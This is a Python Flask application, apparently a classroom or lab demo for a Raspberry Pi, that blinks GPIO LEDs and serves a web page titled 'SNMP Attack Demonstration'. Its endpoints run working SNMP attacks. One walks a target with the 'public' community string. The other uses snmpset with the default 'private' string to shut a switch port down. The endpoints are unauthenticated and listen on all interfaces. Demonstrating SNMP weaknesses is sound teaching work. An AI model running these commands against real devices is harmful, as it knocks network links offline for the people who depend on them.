from flask import Flask, jsonify, request, Response
import pigpio, time, threading, subprocess, shlex, json, datetime
from collections import deque
import random

# ===================== CONFIGURATION =====================
# GPIO Pins
PIN_R = 17   # RGB red (active-LOW) - Attack indicator
PIN_X = 27   # LED (active-HIGH) - Status indicator
PIN_Y = 22   # LED (active-HIGH) - Network activity
PIN_A = 10   # LED (active-HIGH) - System status
PIN_B = 9    # LED (active-HIGH) - Alert indicator

# Polarity settings
R_ACTIVE_LOW = True
X_ACTIVE_LOW = False
Y_ACTIVE_LOW = False
A_ACTIVE_LOW = False
B_ACTIVE_LOW = False

PORT = 5050

# Attack detection settings
ATTACK_THRESHOLD = 3  # Number of rapid requests to trigger attack mode
ATTACK_WINDOW = 10    # Time window in seconds to detect rapid requests
ATTACK_COOLDOWN = 30  # Seconds to stay in attack mode

# ===================== GLOBAL STATE =====================
attack_detected = False
attack_start_time = None
request_history = deque(maxlen=50)  # Track recent requests
current_animation = None
animation_lock = threading.Lock()

# ===================== GPIO INITIALIZATION =====================
pi = pigpio.pi()
if not pi.connected:
    raise SystemExit("pigpiod not running. Start with: sudo systemctl enable --now pigpiod")

def _set(pin, active_low, on: bool):
    """Set GPIO pin with proper polarity handling"""
    level = 0 if (on and active_low) else (1 if on else (1 if active_low else 0))
    pi.write(pin, level)

def _off_all():
    """Turn off all LEDs"""
    _set(PIN_R, R_ACTIVE_LOW, False)
    _set(PIN_X, X_ACTIVE_LOW, False)
    _set(PIN_Y, Y_ACTIVE_LOW, False)
    _set(PIN_A, A_ACTIVE_LOW, False)
    _set(PIN_B, B_ACTIVE_LOW, False)

# Initialize all pins as outputs
for p in (PIN_R, PIN_X, PIN_Y, PIN_A, PIN_B):
    pi.set_mode(p, pigpio.OUTPUT)
_off_all()

# ===================== ANIMATION SYSTEM =====================
class AnimationController:
    def __init__(self):
        self.current_thread = None
        self.stop_event = threading.Event()
        self.lock = threading.Lock()
    
    def start_animation(self, animation_func, *args, **kwargs):
        """Start a new animation, stopping any existing one"""
        with self.lock:
            self.stop_animation()
            self.stop_event.clear()
            self.current_thread = threading.Thread(
                target=animation_func, 
                args=args, 
                kwargs=kwargs, 
                daemon=True
            )
            self.current_thread.start()
            return True
    
    def stop_animation(self):
        """Stop current animation and turn off all LEDs"""
        with self.lock:
            self.stop_event.set()
            if self.current_thread and self.current_thread.is_alive():
                self.current_thread.join(timeout=0.5)
            self.current_thread = None
            _off_all()

anim_controller = AnimationController()

def _apply_states(r, x, y, a, b):
    """Apply LED states"""
    _set(PIN_R, R_ACTIVE_LOW, r)
    _set(PIN_X, X_ACTIVE_LOW, x)
    _set(PIN_Y, Y_ACTIVE_LOW, y)
    _set(PIN_A, A_ACTIVE_LOW, a)
    _set(PIN_B, B_ACTIVE_LOW, b)

# ===================== ANIMATION PATTERNS =====================
def normal_operation():
    """Normal operation pattern - gentle breathing effect"""
    while not anim_controller.stop_event.is_set():
        # Gentle breathing pattern
        for i in range(0, 101, 5):
            if anim_controller.stop_event.is_set():
                break
            brightness = i / 100.0
            _set(PIN_A, A_ACTIVE_LOW, brightness > 0.3)
            _set(PIN_Y, Y_ACTIVE_LOW, brightness > 0.6)
            time.sleep(0.05)
        
        for i in range(100, -1, -5):
            if anim_controller.stop_event.is_set():
                break
            brightness = i / 100.0
            _set(PIN_A, A_ACTIVE_LOW, brightness > 0.3)
            _set(PIN_Y, Y_ACTIVE_LOW, brightness > 0.6)
            time.sleep(0.05)

def attack_detection():
    """Attack detection pattern - aggressive pulsing"""
    while not anim_controller.stop_event.is_set():
        # Rapid red pulsing
        for _ in range(3):
            if anim_controller.stop_event.is_set():
                break
            _set(PIN_R, R_ACTIVE_LOW, True)
            _set(PIN_B, B_ACTIVE_LOW, True)
            time.sleep(0.1)
            _set(PIN_R, R_ACTIVE_LOW, False)
            _set(PIN_B, B_ACTIVE_LOW, False)
            time.sleep(0.1)
        
        # Chase pattern
        if not anim_controller.stop_event.is_set():
            sequence = [
                (True, False, False, False, False),
                (False, True, False, False, False),
                (False, False, True, False, False),
                (False, False, False, True, False),
                (False, False, False, False, True),
            ]
            for state in sequence:
                if anim_controller.stop_event.is_set():
                    break
                _apply_states(*state)
                time.sleep(0.15)
            _off_all()
            time.sleep(0.5)

def packet_flow():
    """Packet flow animation - wave across LEDs"""
    sequence = [
        (True, False, False, False, False),
        (False, True, False, False, False),
        (False, False, True, False, False),
        (False, False, False, True, False),
        (False, False, False, False, True),
    ]
    for state in sequence:
        _apply_states(*state)
        time.sleep(0.12)
    _off_all()

def error_pattern():
    """Error pattern - red strobe"""
    for _ in range(4):
        _set(PIN_R, R_ACTIVE_LOW, True)
        time.sleep(0.1)
        _set(PIN_R, R_ACTIVE_LOW, False)
        time.sleep(0.1)

def success_pattern():
    """Success pattern - green wave"""
    sequence = [
        (False, True, False, False, False),
        (False, False, True, False, False),
        (False, False, False, True, False),
        (False, False, False, False, True),
    ]
    for state in sequence:
        _apply_states(*state)
        time.sleep(0.08)
    _off_all()

# ===================== ATTACK DETECTION =====================
def log_request(endpoint):
    """Log a request for attack detection"""
    global attack_detected, attack_start_time
    now = time.time()
    request_history.append((now, endpoint))
    
    # Check for rapid requests in attack window
    recent_requests = [req for req in request_history if now - req[0] <= ATTACK_WINDOW]
    
    if len(recent_requests) >= ATTACK_THRESHOLD and not attack_detected:
        attack_detected = True
        attack_start_time = now
        print(f"[{datetime.datetime.now()}] 🚨 ATTACK DETECTED! {len(recent_requests)} requests in {ATTACK_WINDOW}s")
        anim_controller.start_animation(attack_detection)
    
    # Reset attack mode after cooldown
    elif attack_detected and (now - attack_start_time) > ATTACK_COOLDOWN:
        attack_detected = False
        attack_start_time = None
        print(f"[{datetime.datetime.now()}] ✅ Attack mode cleared")
        anim_controller.start_animation(normal_operation)

# ===================== SHELL HELPERS =====================
def _run(cmd: str, timeout=6):
    """Run shell command with timeout"""
    try:
        cp = subprocess.run(shlex.split(cmd), capture_output=True, text=True, timeout=timeout)
        return cp.returncode, cp.stdout.strip(), cp.stderr.strip()
    except subprocess.TimeoutExpired:
        return 124, "", f"timeout after {timeout}s"

# ===================== FLASK APP =====================
app = Flask(__name__)

# ===================== API ENDPOINTS =====================
@app.get("/start")
def start():
    """Start normal operation animation"""
    log_request("start")
    try:
        hz = float(request.args.get("hz", "1.0"))
        step_period = 1.0 / max(0.1, hz)
    except:
        hz = 1.0
        step_period = 1.0
    
    if not attack_detected:
        anim_controller.start_animation(normal_operation)
    
    return jsonify(ok=True, anim="normal_operation", hz=hz, attack_mode=attack_detected)

@app.get("/stop")
def stop():
    """Stop all animations"""
    log_request("stop")
    anim_controller.stop_animation()
    return jsonify(ok=True, stopped=True)

@app.get("/off")
def off():
    """Turn off all LEDs"""
    log_request("off")
    anim_controller.stop_animation()
    _off_all()
    return jsonify(ok=True)

@app.get("/status")
def status():
    """Get current system status"""
    return jsonify(
        ok=True,
        attack_detected=attack_detected,
        attack_start_time=attack_start_time,
        request_count=len(request_history),
        pins={
            "17": pi.read(PIN_R),
            "27": pi.read(PIN_X),
            "22": pi.read(PIN_Y),
            "10": pi.read(PIN_A),
            "9": pi.read(PIN_B),
        }
    )

@app.get("/events")
def events():
    """Server-Sent Events for real-time status updates"""
    def gen():
        while True:
            data = {
                "pins": {
                    "17": pi.read(PIN_R),
                    "27": pi.read(PIN_X),
                    "22": pi.read(PIN_Y),
                    "10": pi.read(PIN_A),
                    "9": pi.read(PIN_B),
                },
                "attack_detected": attack_detected,
                "request_count": len(request_history),
                "timestamp": time.time()
            }
            yield f"data: {json.dumps(data)}\n\n"
            time.sleep(0.5)
    return Response(gen(), mimetype="text/event-stream")

@app.post("/demo/packet")
def demo_packet():
    """Demo packet animation"""
    log_request("demo_packet")
    threading.Thread(target=packet_flow, daemon=True).start()
    return jsonify(ok=True)

# ===================== SNMP ATTACK ENDPOINTS =====================
@app.get("/snmp/walk")
def snmp_walk():
    """Execute SNMP walk attack"""
    log_request("snmp_walk")
    target = request.args.get("target", "").strip()
    community = request.args.get("community", "public").strip()
    
    if not target:
        return jsonify(ok=False, error="target required"), 400
    
    # Visual feedback
    threading.Thread(target=packet_flow, daemon=True).start()
    
    cmd = f"snmpwalk -v2c -c {community} {target} 1.3.6.1.2.1.31.1.1.1.1"
    code, out, err = _run(cmd, timeout=8)
    
    if code == 0:
        threading.Thread(target=success_pattern, daemon=True).start()
    else:
        threading.Thread(target=error_pattern, daemon=True).start()
    
    return jsonify(
        ok=(code==0), 
        cmd=cmd, 
        code=code, 
        stdout=out, 
        stderr=err,
        attack_detected=attack_detected
    )

@app.get("/snmp/portdown")
def snmp_portdown():
    """Execute SNMP port down attack"""
    log_request("snmp_portdown")
    target = request.args.get("target", "").strip()
    community = request.args.get("community", "private").strip()
    ifindex = request.args.get("ifindex", "").strip()
    
    if not (target and ifindex.isdigit()):
        return jsonify(ok=False, error="target and numeric ifindex required"), 400
    
    # Visual feedback
    threading.Thread(target=packet_flow, daemon=True).start()
    
    set_oid = f"1.3.6.1.2.1.2.2.1.7.{ifindex}"
    set_cmd = f"snmpset -v2c -c {community} {target} {set_oid} i 2"
    code, out, err = _run(set_cmd, timeout=6)
    
    if code == 0:
        threading.Thread(target=success_pattern, daemon=True).start()
    else:
        threading.Thread(target=error_pattern, daemon=True).start()
    
    # Verify the change
    get_oid = f"1.3.6.1.2.1.2.2.1.8.{ifindex}"
    get_cmd = f"snmpget -v2c -c public {target} {get_oid}"
    gcode, gout, gerr = _run(get_cmd, timeout=5)
    
    return jsonify(
        ok=(code==0),
        set_cmd=set_cmd,
        set_code=code,
        set_stdout=out,
        set_stderr=err,
        confirm_cmd=get_cmd,
        confirm_code=gcode,
        confirm_stdout=gout,
        confirm_stderr=gerr,
        attack_detected=attack_detected
    )

# ===================== ENHANCED WEB INTERFACE =====================
HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>SNMP Attack Demonstration - Raspberry Pi</title>
<style>
  :root { 
    --bg:#0a0e14; 
    --card:#111820; 
    --muted:#8a94a0; 
    --accent:#00d3a7; 
    --danger:#ff5d73; 
    --warning:#ffa726;
    --success:#4caf50;
  }
  html,body { 
    margin:0; padding:0; 
    background:var(--bg); 
    color:#e8eef5; 
    font-family:system-ui,-apple-system,Segoe UI,Roboto,Ubuntu,Helvetica,Arial,sans-serif;
    line-height:1.6;
  }
  .wrap { max-width:1200px; margin:24px auto; padding:0 16px; }
  .grid { display:grid; grid-template-columns: 1.2fr 1fr; gap:20px; }
  .card { 
    background:var(--card); 
    border-radius:16px; 
    padding:20px; 
    box-shadow:0 8px 32px rgba(0,0,0,.4);
    border:1px solid rgba(255,255,255,.05);
  }
  h1 { 
    font-weight:700; 
    margin:0 0 8px; 
    font-size:24px;
    background:linear-gradient(45deg, #00d3a7, #00b8ff);
    -webkit-background-clip:text;
    -webkit-text-fill-color:transparent;
  }
  h2 { 
    font-weight:600; 
    font-size:16px; 
    margin:0 0 12px; 
    color:var(--muted);
    text-transform:uppercase;
    letter-spacing:0.5px;
  }
  .row { 
    display:flex; 
    gap:12px; 
    flex-wrap:wrap; 
    align-items:center;
    margin-bottom:12px;
  }
  button { 
    background:#1a2332; 
    border:1px solid #2a3847; 
    color:#e8eef5; 
    padding:12px 16px; 
    border-radius:12px; 
    cursor:pointer; 
    font-weight:600;
    transition:all 0.2s ease;
    font-size:14px;
  }
  button:hover { 
    border-color:#3b4f64;
    background:#1e2a3a;
    transform:translateY(-1px);
  }
  button.accent { 
    background:linear-gradient(135deg, #0c2b25, #1c4c3f); 
    border-color:#1c4c3f; 
    color:#b6fff0;
  }
  button.danger { 
    background:linear-gradient(135deg, #2b1217, #4c1c26); 
    border-color:#4c1c26; 
    color:#ffc5cd;
  }
  button.warning {
    background:linear-gradient(135deg, #2b1a0a, #4c2d1a);
    border-color:#4c2d1a;
    color:#ffd699;
  }
  input, select { 
    background:#0f151d; 
    color:#e8eef5; 
    border:1px solid #2b3949; 
    border-radius:10px; 
    padding:10px 12px;
    font-size:14px;
  }
  input:focus, select:focus {
    outline:none;
    border-color:#00d3a7;
    box-shadow:0 0 0 2px rgba(0,211,167,0.2);
  }
  .stage { 
    width:100%; 
    height:320px; 
    background:linear-gradient(135deg, #0c1218, #0f1a24); 
    border:1px solid #18222f; 
    border-radius:16px;
    position:relative;
    overflow:hidden;
  }
  .node { 
    fill:#101825; 
    stroke:#2b3a4a; 
    stroke-width:2;
    filter:drop-shadow(0 4px 8px rgba(0,0,0,0.3));
  }
  .node.attacker { stroke:#ff5d73; }
  .node.target { stroke:#00d3a7; }
  .node-label { 
    fill:#c7d4e5; 
    font-weight:600; 
    font-size:13px;
    text-anchor:middle;
  }
  .packet { 
    fill:#35f9c9; 
    filter:url(#glow); 
    opacity:0;
    r:6;
  }
  .attack-indicator {
    position:absolute;
    top:20px;
    right:20px;
    padding:8px 16px;
    border-radius:20px;
    font-size:12px;
    font-weight:600;
    text-transform:uppercase;
    letter-spacing:0.5px;
    opacity:0;
    transition:opacity 0.3s ease;
  }
  .attack-indicator.active {
    opacity:1;
    animation:pulse 2s infinite;
  }
  @keyframes pulse {
    0%, 100% { transform:scale(1); }
    50% { transform:scale(1.05); }
  }
  .dotbar { 
    display:flex; 
    gap:10px; 
    margin-top:15px;
    justify-content:center;
  }
  .dot { 
    width:16px; 
    height:16px; 
    border-radius:50%; 
    background:#1a2430; 
    border:2px solid #2a3a4b; 
    box-shadow:inset 0 0 8px rgba(0,0,0,.6);
    transition:all 0.2s ease;
  }
  .dot.on { 
    background:#35f9c9; 
    box-shadow:0 0 16px #29ffd1, inset 0 0 6px rgba(0,0,0,.3);
    border-color:#35f9c9;
  }
  .dot.r.on { 
    background:#ff556b; 
    box-shadow:0 0 16px #ff556b;
    border-color:#ff556b;
  }
  .log { 
    font:13px/1.5 ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; 
    color:#cfe6ff; 
    max-height:280px; 
    overflow:auto; 
    background:#0c1218; 
    border:1px solid #18222f; 
    padding:15px; 
    border-radius:12px;
    scrollbar-width:thin;
    scrollbar-color:#2a3a4b #0c1218;
  }
  .log::-webkit-scrollbar {
    width:8px;
  }
  .log::-webkit-scrollbar-track {
    background:#0c1218;
  }
  .log::-webkit-scrollbar-thumb {
    background:#2a3a4b;
    border-radius:4px;
  }
  .status-bar {
    display:flex;
    justify-content:space-between;
    align-items:center;
    padding:12px 16px;
    background:rgba(0,0,0,0.2);
    border-radius:12px;
    margin-bottom:16px;
  }
  .status-item {
    display:flex;
    align-items:center;
    gap:8px;
    font-size:14px;
  }
  .status-dot {
    width:8px;
    height:8px;
    border-radius:50%;
    background:#4caf50;
  }
  .status-dot.warning { background:#ffa726; }
  .status-dot.danger { background:#ff5d73; }
</style>
</head>
<body>
<div class="wrap">
  <h1>🚨 SNMP Attack Demonstration</h1>
  
  <div class="status-bar">
    <div class="status-item">
      <div id="status-dot" class="status-dot"></div>
      <span id="status-text">System Normal</span>
    </div>
    <div class="status-item">
      <span>Requests: <span id="request-count">0</span></span>
    </div>
    <div class="status-item">
      <span id="attack-status" class="attack-indicator">🚨 ATTACK DETECTED</span>
    </div>
  </div>

  <div class="grid">
    <div class="card">
      <h2>🎯 Visual Attack Monitor</h2>
      <svg class="stage" viewBox="0 0 820 320" xmlns="http://www.w3.org/2000/svg">
        <defs>
          <filter id="glow">
            <feGaussianBlur stdDeviation="4" result="g"/>
            <feMerge>
              <feMergeNode in="g"/>
              <feMergeNode in="SourceGraphic"/>
            </feMerge>
          </filter>
          <path id="p" d="M120,180 C280,100 540,100 700,180" fill="none" stroke="none"/>
        </defs>
        <rect x="60"  y="140" rx="12" ry="12" width="120" height="80" class="node attacker"/>
        <text x="120" y="185" class="node-label">Attacker</text>
        <rect x="640" y="140" rx="12" ry="12" width="120" height="80" class="node target"/>
        <text x="700" y="185" class="node-label">Target Switch</text>
        <use href="#p" stroke="#27425a" stroke-width="3" stroke-dasharray="5 5"/>
        <circle id="pkt" class="packet">
          <animateMotion id="am" dur="1.2s" fill="freeze" path="M120,180 C280,100 540,100 700,180"/>
        </circle>
      </svg>
      <div class="row" style="margin-top:15px; justify-content:center">
        <div class="dotbar">
          <div id="d17" class="dot r" title="Attack Indicator (GPIO17)"></div>
          <div id="d27" class="dot"  title="Status (GPIO27)"></div>
          <div id="d22" class="dot"  title="Network (GPIO22)"></div>
          <div id="d10" class="dot"  title="System (GPIO10)"></div>
          <div id="d09" class="dot"  title="Alert (GPIO9)"></div>
        </div>
      </div>
      <div class="row" style="justify-content:center; margin-top:10px">
        <button class="accent" onclick="sendPacket()">📡 Send Test Packet</button>
      </div>
    </div>

    <div class="card">
      <h2>🎮 Control Panel</h2>
      <div class="row">
        <button class="accent" onclick="startNormal()">🟢 Start Normal</button>
        <button onclick="stopAll()">⏹️ Stop All</button>
        <select id="hz">
          <option value="1">1 Hz</option>
          <option value="2">2 Hz</option>
          <option value="3">3 Hz</option>
          <option value="5">5 Hz</option>
        </select>
      </div>

      <h2 style="margin-top:20px">🔓 SNMP Attack Tools</h2>
      <div class="row">
        <input id="target" placeholder="Target IP Address" style="min-width:200px">
        <input id="pub" placeholder="RO Community" value="public" style="width:120px">
      </div>
      <div class="row">
        <input id="priv" placeholder="RW Community" value="private" style="width:120px">
        <input id="ifidx" placeholder="Interface Index" style="width:120px">
      </div>
      <div class="row">
        <button onclick="snmpWalk()">🔍 SNMP Walk</button>
        <button class="danger" onclick="snmpDown()">💥 Port Down</button>
      </div>
      
      <h2 style="margin-top:20px">⚡ Quick Actions</h2>
      <div class="row">
        <button class="warning" onclick="triggerAttack()">🚨 Simulate Attack</button>
        <button onclick="clearAttack()">✅ Clear Attack</button>
      </div>
    </div>
  </div>

  <div class="card" style="margin-top:20px">
    <h2>📊 Event Log</h2>
    <div id="log" class="log"></div>
  </div>
</div>

<script>
const logDiv = document.getElementById('log');
const statusDot = document.getElementById('status-dot');
const statusText = document.getElementById('status-text');
const attackStatus = document.getElementById('attack-status');
const requestCount = document.getElementById('request-count');

function log(msg, type='info'){
  const t = new Date().toLocaleTimeString();
  const color = type === 'error' ? '#ff9aa9' : type === 'success' ? '#4caf50' : type === 'warning' ? '#ffa726' : '#cfe6ff';
  logDiv.innerHTML = `<span style="color:${color}">[${t}] ${msg}</span><br>` + logDiv.innerHTML;
}

function escapeHtml(s){ 
  return s.replace(/[&<>"']/g,m=>({"&":"&amp;","<":"&lt;",">":"&gt;","\"":"&quot;","'":"&#039;"}[m])); 
}

function updateStatus(attackDetected, requestCount) {
  if (attackDetected) {
    statusDot.className = 'status-dot danger';
    statusText.textContent = '🚨 ATTACK DETECTED';
    attackStatus.classList.add('active');
  } else {
    statusDot.className = 'status-dot';
    statusText.textContent = 'System Normal';
    attackStatus.classList.remove('active');
  }
  requestCount.textContent = requestCount;
}

function startNormal(){
  const hz = document.getElementById('hz').value;
  fetch('/start?hz='+hz).then(r=>r.json()).then(j=>{
    log("Started normal operation", 'success');
  });
}

function stopAll(){
  fetch('/stop').then(()=>log("Stopped all animations", 'warning'));
}

function snmpWalk(){
  const t = document.getElementById('target').value.trim();
  const c = document.getElementById('pub').value.trim() || 'public';
  if(!t){ alert("Enter target IP"); return; }
  
  sendPacket();
  log(`🔍 SNMP Walk: ${t}`, 'info');
  
  fetch('/snmp/walk?target='+encodeURIComponent(t)+'&community='+encodeURIComponent(c))
    .then(r=>r.json()).then(j=>{
      if(j.ok){
        log("✅ SNMP Walk successful", 'success');
        if(j.stdout) log("<pre>"+escapeHtml(j.stdout)+"</pre>");
      } else {
        log("❌ SNMP Walk failed", 'error');
        if(j.stderr) log("<pre style='color:#ff9aa9'>"+escapeHtml(j.stderr)+"</pre>");
      }
    });
}

function snmpDown(){
  const t = document.getElementById('target').value.trim();
  const w = document.getElementById('priv').value.trim() || 'private';
  const x = document.getElementById('ifidx').value.trim();
  if(!t||!x){ alert("Enter target & ifIndex"); return; }
  
  sendPacket();
  log(`💥 SNMP Port Down: ${t}:${x}`, 'warning');
  
  fetch('/snmp/portdown?target='+encodeURIComponent(t)+'&community='+encodeURIComponent(w)+'&ifindex='+encodeURIComponent(x))
    .then(r=>r.json()).then(j=>{
      if(j.ok){
        log("✅ Port down successful", 'success');
        if(j.set_stdout) log("<pre>"+escapeHtml(j.set_stdout)+"</pre>");
      } else {
        log("❌ Port down failed", 'error');
        if(j.set_stderr) log("<pre style='color:#ff9aa9'>"+escapeHtml(j.set_stderr)+"</pre>");
      }
    });
}

function triggerAttack(){
  log("🚨 Simulating attack pattern...", 'warning');
  for(let i = 0; i < 5; i++) {
    setTimeout(() => {
      fetch('/demo/packet', {method:'POST'});
    }, i * 200);
  }
}

function clearAttack(){
  log("✅ Clearing attack state", 'success');
  fetch('/stop').then(() => {
    setTimeout(() => fetch('/start'), 500);
  });
}

function sendPacket(){
  const pkt = document.getElementById('pkt');
  const am = document.getElementById('am');
  pkt.style.opacity = 1;
  am.beginElement();
  setTimeout(() => { pkt.style.opacity = 0; }, 1200);
  fetch('/demo/packet', {method:'POST'});
}

// Real-time status updates via SSE
const evt = new EventSource('/events');
evt.onmessage = (e) => {
  try{
    const data = JSON.parse(e.data);
    const pins = (data && data.pins) || {};
    
    setDot('d17', pins["17"]); 
    setDot('d27', pins["27"]);
    setDot('d22', pins["22"]); 
    setDot('d10', pins["10"]);
    setDot('d09', pins["9"]);
    
    updateStatus(data.attack_detected, data.request_count);
  } catch(err) {
    console.error('SSE parse error:', err);
  }
};

function setDot(id, level){
  const el = document.getElementById(id);
  if(!el) return;
  el.classList.toggle('on', level === 1);
}

// Initialize
log("🎯 SNMP Attack Demonstration System Ready", 'success');
log("💡 Connect to this page from attacker machine to demonstrate SNMP vulnerabilities", 'info');
</script>
</body>
</html>
"""

@app.get("/")
def index():
    return Response(HTML, mimetype="text/html")

# ===================== INITIALIZATION =====================
if __name__ == "__main__":
    import socket
    
    # Get Raspberry Pi's IP address
    def get_local_ip():
        try:
            # Connect to a remote address to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return "localhost"
    
    local_ip = get_local_ip()
    
    print(f"[{datetime.datetime.now()}] 🚀 Starting SNMP Attack Demonstration System")
    print(f"[{datetime.datetime.now()}] 📍 Web interface available at:")
    print(f"    Local:  http://localhost:{PORT}")
    print(f"    Network: http://{local_ip}:{PORT}")
    print(f"[{datetime.datetime.now()}] 🎯 Attack detection enabled: {ATTACK_THRESHOLD} requests in {ATTACK_WINDOW}s")
    print(f"[{datetime.datetime.now()}] 💡 Start normal operation animation...")
    
    # Start normal operation animation
    anim_controller.start_animation(normal_operation)
    
    app.run(host="0.0.0.0", port=PORT, debug=False)
